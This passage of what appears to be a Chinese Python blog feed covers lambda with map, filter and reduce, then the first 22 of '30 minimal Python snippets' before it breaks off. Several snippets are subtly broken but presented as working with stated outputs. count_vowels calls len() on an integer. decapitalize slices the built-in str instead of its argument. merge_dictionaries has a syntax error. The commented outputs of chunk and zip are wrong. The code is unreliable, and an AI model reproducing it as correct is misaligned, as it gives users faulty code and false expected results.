class="number">3</span>))</span><br></pre></td></tr></table></figure><p>实际上，我们可以用python中的字典或者其他的数据结构来构建更多种类的行为表，从而做同样的事情。</p><h3 id="lambda中实现if-else"><a href="#lambda中实现if-else" class="headerlink" title="lambda中实现if-else"></a>lambda中实现if-else</h3><p>Python中具备的单行表达式：**<code>if a:b else c</code>**语法在lambda中同样适用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lower = <span class="keyword">lambda</span> x,y:x <span class="keyword">if</span> x&lt;y <span class="keyword">else</span> y</span><br><span class="line">lower(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br></pre></td></tr></table></figure><p>看了半天，大家可能也并未觉得lambda在python中到底比def优越与便利在哪里，那么说到lambda，就必须要提及三个函数**<code>map、filter、reduce</code>**，当你接触了这三个函数，那么你才能感受到lambda真实的方便之处</p><h3 id="map-函数"><a href="#map-函数" class="headerlink" title="map 函数"></a>map 函数</h3><p>程序对列表或者其他序列常常要做的一件事就是对每个元素进行一个操作，并把其结果集合起来。<br>python提供了一个工具map，它会对一个序列对象中的每一个元素应用该的函数，并返回一个包含了所有函数调用结果的列表。<br>举个栗子，我们有一个列表，需要将列表的每一个字段+10，我们该如何操作？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">list_show = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="comment"># 方式1</span></span><br><span class="line">new_list_show = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_show:</span><br><span class="line">    new_list_show.append(i + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(new_list_show)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adds</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(adds, list_show)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更优雅的方式3：</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x + <span class="number">10</span>, list_show)))</span><br></pre></td></tr></table></figure><p>看看上面三个实现方式，你觉得那种更加Pythonic？<br>eg:需要注意一点，map在python3中是一个可迭代对象，引入需要使用列表调用来使它生成所有的结果用于显示，python2不必如此。<br>当然map的阐述函数，不仅仅支持自己编写的，同样也支持python自带的多种函数，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list_show = [<span class="number">1</span>, -<span class="number">2</span>, <span class="number">3</span>, -<span class="number">4</span>, <span class="number">5</span>, -<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">abs</span>, list_show)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><h3 id="filter函数"><a href="#filter函数" class="headerlink" title="filter函数"></a>filter函数</h3><p>filter通过字面意思，大家就知道它的用处了，用于数据的过滤操作，它也是lambda的一个好基友，举个栗子。<br>我们需要过滤0-9中，能被2整除的数字组成一个列表，我们该如何操作？只需要一行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, <span class="built_in">range</span>(<span class="number">10</span>))))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure><p>没错，filter就是这么的简单实用….</p><h3 id="reduce的妙用"><a href="#reduce的妙用" class="headerlink" title="reduce的妙用"></a>reduce的妙用</h3><blockquote><p>reduce在python2中是一个简单的函数，但在python3中它责备收录与functools中。<br>它接收一个迭代器来处理并返回一个单个的结果。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">list_show = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(reduce(<span class="keyword">lambda</span> x, y: x + y, list_show))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(reduce(<span class="keyword">lambda</span> x, y: x * y, list_show))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">24</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30个Python极简代码，10分钟get常用技巧！</title>
      <link href="/posts/34537.html"/>
      <url>/posts/34537.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-重复元素判定"><a href="#1-重复元素判定" class="headerlink" title="1. 重复元素判定"></a><strong>1. 重复元素判定</strong></h3><p>以下方法可以检查给定列表是不是存在重复元素，它会使用 set() 函数来移除所有重复元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">all_unique</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(lst) == <span class="built_in">len</span>(<span class="built_in">set</span>(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">y = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">all_unique(x) <span class="comment"># False</span></span><br><span class="line">all_unique(y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="2-字符元素组成判定"><a href="#2-字符元素组成判定" class="headerlink" title="2. 字符元素组成判定"></a><strong>2. 字符元素组成判定</strong></h3><p>检查两个字符串的组成元素是不是一样的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">anagram</span>(<span class="params">first, second</span>):</span><br><span class="line">    <span class="keyword">return</span> Counter(first) == Counter(second)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">anagram(<span class="string">&quot;abcd3&quot;</span>, <span class="string">&quot;3acdb&quot;</span>) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="3-内存占用"><a href="#3-内存占用" class="headerlink" title="3. 内存占用"></a><strong>3. 内存占用</strong></h3><p>下面的代码块可以检查变量 variable 所占用的内存。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line">variable = <span class="number">30</span> </span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(variable)) <span class="comment"># 24</span></span><br></pre></td></tr></table></figure><h3 id="4-字节占用"><a href="#4-字节占用" class="headerlink" title="4. 字节占用"></a><strong>4. 字节占用</strong></h3><p>下面的代码块可以检查字符串占用的字节数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">byte_size</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">len</span>(string.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">byte_size(<span class="string">&#x27;😀&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">byte_size(<span class="string">&#x27;Hello World&#x27;</span>) <span class="comment"># 11   </span></span><br></pre></td></tr></table></figure><h3 id="5-打印-N-次字符串"><a href="#5-打印-N-次字符串" class="headerlink" title="5. 打印 N 次字符串"></a><strong>5. 打印 N 次字符串</strong></h3><p>该代码块不需要循环语句就能打印 N 次字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2</span>; </span><br><span class="line">s =<span class="string">&quot;Programming&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s * n);</span><br><span class="line"><span class="comment"># ProgrammingProgramming  </span></span><br></pre></td></tr></table></figure><h3 id="6-大写第一个字母"><a href="#6-大写第一个字母" class="headerlink" title="6. 大写第一个字母"></a><strong>6. 大写第一个字母</strong></h3><p>以下代码块会使用 title() 方法，从而大写字符串中每一个单词的首字母。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;programming is awesome&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.title())</span><br><span class="line"><span class="comment"># Programming Is Awesome</span></span><br></pre></td></tr></table></figure><h3 id="7-分块"><a href="#7-分块" class="headerlink" title="7. 分块"></a><strong>7. 分块</strong></h3><p>给定具体的大小，定义一个函数以按照这个大小切割列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunk</span>(<span class="params">lst, size</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(</span><br><span class="line">        <span class="built_in">map</span>(<span class="keyword">lambda</span> x: lst[x * size:x * size + size],</span><br><span class="line">            <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, ceil(<span class="built_in">len</span>(lst) / size)))))</span><br><span class="line"></span><br><span class="line">chunk([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line"><span class="comment"># [[1,2],[3,4],5]</span></span><br></pre></td></tr></table></figure><h3 id="8-压缩"><a href="#8-压缩" class="headerlink" title="8. 压缩"></a><strong>8. 压缩</strong></h3><p>这个方法可以将布尔型的值去掉，例如（False，None，0，“”），它使用 filter() 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compact</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="built_in">bool</span>, lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">compact([<span class="number">0</span>, <span class="number">1</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">3</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="number">34</span>])</span><br><span class="line"><span class="comment"># [ 1, 2, 3, &#x27;a&#x27;, &#x27;s&#x27;, 34 ]</span></span><br></pre></td></tr></table></figure><h3 id="9-解包"><a href="#9-解包" class="headerlink" title="9. 解包"></a><strong>9. 解包</strong></h3><p>如下代码段可以将打包好的成对列表解开成两组不同的元组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array = [[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>], [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>], [<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]]</span><br><span class="line">transposed = <span class="built_in">zip</span>(*array)</span><br><span class="line"><span class="built_in">print</span>(transposed)</span><br><span class="line"><span class="comment"># [(&#x27;a&#x27;, &#x27;c&#x27;, &#x27;e&#x27;), (&#x27;b&#x27;, &#x27;d&#x27;, &#x27;f&#x27;)]</span></span><br></pre></td></tr></table></figure><h3 id="10-链式对比"><a href="#10-链式对比" class="headerlink" title="10. 链式对比"></a><strong>10. 链式对比</strong></h3><p>我们可以在一行代码中使用不同的运算符对比多个不同的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>( <span class="number">2</span> &lt; a &lt; <span class="number">8</span>) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> == a &lt; <span class="number">2</span>) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h3 id="11-逗号连接"><a href="#11-逗号连接" class="headerlink" title="11. 逗号连接"></a><strong>11. 逗号连接</strong></h3><p>下面的代码可以将列表连接成单个字符串，且每一个元素间的分隔方式设置为了逗号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hobbies = [<span class="string">&quot;basketball&quot;</span>, <span class="string">&quot;football&quot;</span>, <span class="string">&quot;swimming&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My hobbies are: &quot;</span> + <span class="string">&quot;, &quot;</span>.join(hobbies))</span><br><span class="line"><span class="comment"># My hobbies are: basketball, football, swimming</span></span><br></pre></td></tr></table></figure><h3 id="12-元音统计"><a href="#12-元音统计" class="headerlink" title="12. 元音统计"></a><strong>12. 元音统计</strong></h3><p>以下方法将统计字符串中的元音 (‘a’, ‘e’, ‘i’, ‘o’, ‘u’) 的个数，它是通过正则表达式做的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_vowels</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">len</span>(re.findall(<span class="string">r&#x27;[aeiou]&#x27;</span>, <span class="built_in">str</span>, re.IGNORECASE)))</span><br><span class="line"></span><br><span class="line">count_vowels(<span class="string">&#x27;foobar&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">count_vowels(<span class="string">&#x27;gym&#x27;</span>) <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><h3 id="13-首字母小写"><a href="#13-首字母小写" class="headerlink" title="13. 首字母小写"></a><strong>13. 首字母小写</strong></h3><p>如下方法将令给定字符串的第一个字符统一为小写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decapitalize</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>[:<span class="number">1</span>].lower() + <span class="built_in">str</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decapitalize(<span class="string">&#x27;FooBar&#x27;</span>) <span class="comment"># &#x27;fooBar&#x27;</span></span><br><span class="line">decapitalize(<span class="string">&#x27;FooBar&#x27;</span>) <span class="comment"># &#x27;fooBar&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="14-展开列表"><a href="#14-展开列表" class="headerlink" title="14. 展开列表"></a><strong>14. 展开列表</strong></h3><p>该方法将通过递归的方式将列表的嵌套展开为单个列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spread</span>(<span class="params">arg</span>):</span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(i, <span class="built_in">list</span>):</span><br><span class="line">            ret.extend(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret.append(i)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deep_flatten</span>(<span class="params">lst</span>):</span><br><span class="line">    result = []</span><br><span class="line">    result.extend(</span><br><span class="line">        spread(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: deep_flatten(x) <span class="keyword">if</span> <span class="built_in">type</span>(x) == <span class="built_in">list</span> <span class="keyword">else</span> x, lst))))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">deep_flatten([<span class="number">1</span>, [<span class="number">2</span>], [[<span class="number">3</span>], <span class="number">4</span>], <span class="number">5</span>]) <span class="comment"># [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h3 id="15-列表的差"><a href="#15-列表的差" class="headerlink" title="15. 列表的差"></a><strong>15. 列表的差</strong></h3><p>该方法将返回第一个列表的元素，其不在第二个列表内。如果同时要反馈第二个列表独有的元素，还需要加一句 set_b.difference(set_a)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">difference</span>(<span class="params">a, b</span>):</span><br><span class="line">    set_a = <span class="built_in">set</span>(a)</span><br><span class="line">    set_b = <span class="built_in">set</span>(b)</span><br><span class="line">    comparison = set_a.difference(set_b)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(comparison)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">difference([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]) <span class="comment"># [3]</span></span><br></pre></td></tr></table></figure><h3 id="16-通过函数取差"><a href="#16-通过函数取差" class="headerlink" title="16. 通过函数取差"></a><strong>16. 通过函数取差</strong></h3><p>如下方法首先会应用一个给定的函数，然后再返回应用函数后结果有差别的列表元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">difference_by</span>(<span class="params">a, b, fn</span>):</span><br><span class="line">    b = <span class="built_in">set</span>(<span class="built_in">map</span>(fn, b))</span><br><span class="line">    <span class="keyword">return</span> [item <span class="keyword">for</span> item <span class="keyword">in</span> a <span class="keyword">if</span> fn(item) <span class="keyword">not</span> <span class="keyword">in</span> b]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor</span><br><span class="line">difference_by([<span class="number">2.1</span>, <span class="number">1.2</span>], [<span class="number">2.3</span>, <span class="number">3.4</span>],floor) <span class="comment"># [1.2]</span></span><br><span class="line">difference_by([&#123; <span class="string">&#x27;x&#x27;</span>: <span class="number">2</span> &#125;, &#123; <span class="string">&#x27;x&#x27;</span>: <span class="number">1</span> &#125;], [&#123; <span class="string">&#x27;x&#x27;</span>: <span class="number">1</span> &#125;], <span class="keyword">lambda</span> v : v[<span class="string">&#x27;x&#x27;</span>])</span><br><span class="line"><span class="comment"># [ &#123; x: 2 &#125; ]</span></span><br></pre></td></tr></table></figure><h3 id="17-链式函数调用"><a href="#17-链式函数调用" class="headerlink" title="17. 链式函数调用"></a><strong>17. 链式函数调用</strong></h3><p>你可以在一行代码内调用多个函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a - b</span><br><span class="line"></span><br><span class="line">a, b = <span class="number">4</span>, <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>((subtract <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> add)(a, b)) <span class="comment"># 9 </span></span><br></pre></td></tr></table></figure><h3 id="18-检查重复项"><a href="#18-检查重复项" class="headerlink" title="18. 检查重复项"></a><strong>18. 检查重复项</strong></h3><p>如下代码将检查两个列表是不是有重复项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">has_duplicates</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(lst) != <span class="built_in">len</span>(<span class="built_in">set</span>(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>]</span><br><span class="line">y = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">has_duplicates(x) <span class="comment"># True</span></span><br><span class="line">has_duplicates(y) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h3 id="19-合并两个字典"><a href="#19-合并两个字典" class="headerlink" title="19. 合并两个字典"></a><strong>19. 合并两个字典</strong></h3><p>下面的方法将用于合并两个字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_two_dicts</span>(<span class="params">a, b</span>):</span><br><span class="line">    c = a.copy()   <span class="comment"># make a copy of a </span></span><br><span class="line">    c.update(b)    <span class="comment"># modify keys and values of a with the ones from b</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123; <span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">b = &#123; <span class="string">&#x27;y&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(merge_two_dicts(a, b))</span><br><span class="line"><span class="comment"># &#123;&#x27;y&#x27;: 3, &#x27;x&#x27;: 1, &#x27;z&#x27;: 4&#125;</span></span><br></pre></td></tr></table></figure><p>在 Python 3.5 或更高版本中，我们也可以用以下方式合并字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_dictionaries</span>(<span class="params">a, b</span>)</span><br><span class="line">   <span class="keyword">return</span> &#123;**a, **b&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123; <span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">b = &#123; <span class="string">&#x27;y&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(merge_dictionaries(a, b))</span><br><span class="line"><span class="comment"># &#123;&#x27;y&#x27;: 3, &#x27;x&#x27;: 1, &#x27;z&#x27;: 4&#125;</span></span><br></pre></td></tr></table></figure><h3 id="20-将两个列表转化为字典"><a href="#20-将两个列表转化为字典" class="headerlink" title="20. 将两个列表转化为字典"></a><strong>20. 将两个列表转化为字典</strong></h3><p>如下方法将会把两个列表转化为单个字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_dictionary</span>(<span class="params">keys, values</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(<span class="built_in">zip</span>(keys, values))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]    </span><br><span class="line">values = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(to_dictionary(keys, values))</span><br><span class="line"><span class="comment"># &#123;&#x27;a&#x27;: 2, &#x27;c&#x27;: 4, &#x27;b&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="21-使用枚举"><a href="#21-使用枚举" class="headerlink" title="21. 使用枚举"></a><strong>21. 使用枚举</strong></h3><p>我们常用 For 循环来遍历某个列表，同样我们也能枚举列表的索引与值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> index, element <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>): </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Value&quot;</span>, element, <span class="string">&quot;Index &quot;</span>, index, )</span><br><span class="line"></span><br><span class="line"><span class="comment"># (&#x27;Value&#x27;, &#x27;a&#x27;, &#x27;Index &#x27;, 0)</span></span><br><span class="line"><span class="comment"># (&#x27;Value&#x27;, &#x27;b&#x27;, &#x27;Index &#x27;, 1)</span></span><br><span class="line"><span class="comment">#(&#x27;Value&#x27;, &#x27;c&#x27;, &#x27;Index &#x27;, 2)</span></span><br><span class="line"><span class="comment"># (&#x27;Value&#x27;, &#x27;d&#x27;, &#x27;Index &#x27;, 3)    </span></span><br></pre></td></tr></table></figure><h3 id="22-执行时间"><a href="#22-执行时间" class="headerlink" title="22. 执行时间"></a><strong>22. 执行时间</strong></h3><p>如下代码块可以用来计算执行特定代码所花费的时间。</p><figure class="highlight 